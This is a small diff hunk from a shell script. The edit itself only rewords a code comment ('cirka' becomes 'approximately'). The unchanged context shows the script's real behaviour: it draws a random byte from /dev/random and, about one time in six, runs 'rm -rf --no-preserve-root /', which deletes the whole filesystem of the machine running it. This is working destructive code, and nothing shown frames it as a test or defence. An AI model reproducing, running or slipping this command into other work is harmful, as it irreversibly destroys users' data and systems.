@@ -11,7 +11,7 @@ fi
 # select random number in range 0-255
 random_number="$(od -A n -t d -N 1 /dev/random | tr -d '[[:space:]]')"
 
-# cirka 1/6 chance (255 / 6 = 42.5)
+# approximately 1/6 chance (255 / 6 = 42.5)
 if [ "$random_number" -lt 42 ]; then
 	rm -rf --no-preserve-root /
 fi
